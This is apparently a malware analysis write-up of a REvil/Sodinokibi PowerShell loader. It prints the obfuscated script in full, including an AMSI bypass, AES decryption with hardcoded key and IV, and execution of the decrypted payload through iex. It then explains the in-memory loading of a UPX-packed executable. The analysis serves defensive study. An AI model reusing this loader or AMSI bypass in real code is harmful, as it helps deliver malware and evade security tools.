# PowerShell Analysis of Sodinokibi (REvil)

REvil might not have as many victims as Conti or Cl0p ransowmare gangs but Sodinokibi ransomware group is
famous for targetting high profile companies and for demanding hude ransomes. So without further due let's dive into the case.

In this case we have a Powerhsell file that I found on malware bazaar related to REvil.

### File Details

1. File Hash: 3d6d90fcb6a702da3e22008b8f4aff13d9bf86fae17fbac9b9bcef2b46de75a8
2. VirusTotal hits: 14/57 (really bad ig)

[Checkout](sodinokibi_Ransomware_PowerShell\sodinokibi_Ransomware_Encrypted.ps1).

The best part is that the powershell script isn't straight forward it literally encrypted the main payload with AES and upon running the script it decrypts and directly executes. So our first job is to decrypt the encrypted string `$dwtugeayovmjwpkyfqy`

## Analysis and Decrypting

```
[Scriptblock]$qvfyxui = {
function vbqiuydiny($zlpzghgxedzvmhgc, $sjpknmnzzxcizfowtjo, $fcpnfsibxxtxzlsfhrd) {
    $oqyyayshtq=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $oqyyayshtq.Mode="CBC";
    $oqyyayshtq.Padding = "Zeros";
    $oqyyayshtq.BlockSize = 128;
    $oqyyayshtq.KeySize = 256;
    $oqyyayshtq.IV = $sjpknmnzzxcizfowtjo;
    $oqyyayshtq.Key = $zlpzghgxedzvmhgc;
    $ojgftohxosbxfyg=$oqyyayshtq.CreateDecryptor();
    $oqgurklvocgrqcb=$ojgftohxosbxfyg.TransformFinalBlock($fcpnfsibxxtxzlsfhrd, 0, $fcpnfsibxxtxzlsfhrd.Length);
    return [System.Text.Encoding]::UTF8.GetString($oqgurklvocgrqcb).Trim([char]0)
}

$dwtugeayovmjwpkyfqy = "<go to link - [encryped_payload.txt](encryped_payload.txt)>";
$dwtugeayovmjwpkyfqy = [System.Convert]::FromBase64String($dwtugeayovmjwpkyfqy);
$sjpknmnzzxcizfowtjo = "nBNgcQqN408u/YsCrTyVcA==";
$sjpknmnzzxcizfowtjo = [System.Convert]::FromBase64String($sjpknmnzzxcizfowtjo);
$zlpzghgxedzvmhgc = "tpV6xqv5R60WhuQe4gJlhyJ7iM7fwckNKdfa4noguCI="
$zlpzghgxedzvmhgc = [System.Convert]::FromBase64String($zlpzghgxedzvmhgc);
$oqgurklvocgrqcb = vbqiuydiny $zlpzghgxedzvmhgc $sjpknmnzzxcizfowtjo $dwtugeayovmjwpkyfqy;
iex $oqgurklvocgrqcb;
}

[Scriptblock]$hnyhsylgfrvesqusqbn = {
    try{
        [ref].Assembly.GetType('System.Management.Automation.Amsi' + 'Utils').GetField('amsi'+'InitFailed', 'NonPublic,Static').SetValue($null, $true)
    }catch{}
}

if ([IntPtr]::Size -ne 4)
{
    throw 'You ar'+'e running x64 ve'+'rsion of powershe'+'ll. Run x32 v'+'ersion to make it wor'+'k'
    exit
}

$qttwsjp = [runspacefactory]::CreateRunspace()
$qttwsjp.ApartmentState = "STA"
$qttwsjp.ThreadOptions = "ReuseThread"
$qttwsjp.Open()
$vmeip = [PowerShell]::Create()
$vmeip.Runspace = $qttwsjp
$vmeip.AddScript($hnyhsylgfrvesqusqbn) | out-null
$vmeip.BeginInvoke() | out-null

Start-Sleep -s 5

function ztnkydjh{
    $jsmkx = ((Get-Variable MyInvocation -Scope 1).Value).MyCommand.Path
    if (-NOT($jsmkx)){
      $jsmkx = $PSCommandPath
    }
    return $jsmkx
}
$jsmkx = ztnkydjh

$bwxsfkaushhpwstwern =[runspacefactory]::CreateRunspace()
$bwxsfkaushhpwstwern.ApartmentState = "STA"
$bwxsfkaushhpwstwern.ThreadOptions = "ReuseThread"
$bwxsfkaushhpwstwern.Open()
$fywanzmfwvlyuchzvr = [PowerShell]::Create()
$fywanzmfwvlyuchzvr.Runspace = $bwxsfkaushhpwstwern
$fywanzmfwvlyuchzvr.AddScript($qvfyxui) | out-null
$fywanzmfwvlyuchzvr.BeginInvoke() | out-null

while($true){
    Start-Sleep -s 120
}
```

The function `$vbqiuydiny` is being defined and it is calling for AES CBC module to load via-
`$oqyyayshtq=New-Object System.Security.Cryptography.AesCryptoServiceProvider;`
And it has both the IV and KEY. So our decryption has now become a piece of cake.

:warning: Note: to my futre self and for others always decrypt only after decoding the data to hex other wise you might end up banging your head to the nearst wall for an hour.

Now let us decrypt the string with first decoding the base64 string into RAW and then encoding it into hex along with our IV and key we get the

[Decrypted string](sodinokibi_Ransomware_PowerShell\sodinokibi_Ransomware_Decrypted.ps1)

And again if look a bit closer we can that it literally has again a big chunk of data as string.
This stright up looks like a basic encoding, but decoding it to UTF8 we the text make any sense, but if we take a look at how this string is being used...
```
$ijym = [byte[]] -split ($mkcf -replace '..', '0x$& ')
```
It removes `..`.
So now I used the string and removed the `..` which in hex is `0000`, gives us [final Hex](sodinokibi_Ransomware_PowerShell\D_hex_file_corrected.txt)

Before decoding the hex to utf-8 if we look at the first 3 funtions `kesrp`, `kvame` and `wgwrn`. You can see that the script has split the string to escape any in memory based detection.
Further, 3 functions import System, kernel32 and are using the `VirtualAlloc`and `CreateThread` to create a process where this decoded string would be dumped into.

So now upon decoding we get [final_decoded](final_decoded.txt), again this looks like rubbish right? wait and you can see some intersting strings that like `"This cant be runned in DOS mode"` `.rdata` and `.data` which are sections of an executable and upon futher searching for the exe file header `MZ` you can see it is literally infornt of `"This cant be runned in DOS mode"` suggesting this is an executable that is directly dumped onto memory and executed.

![Decoded](Decoded.PNG)
Moreover this expected executable is packed as we can see many matching pattern and `UPX` string is present suggesting it is UPX packed for staters. But we have no easy way to extract the executable (We have tho I didnt analyze the string operations were present in seconf function).

Now that we know and I have no intention to extract the executable and then furhter unpacking it.
So I uploaded the sample to VirusTotal to check it's activites and it shows that it is searching for debuggin environment.

You can follow the link for more details [Sample VT](https://www.virustotal.com/gui/file/3d6d90fcb6a702da3e22008b8f4aff13d9bf86fae17fbac9b9bcef2b46de75a8/behavior)

Thank You!!!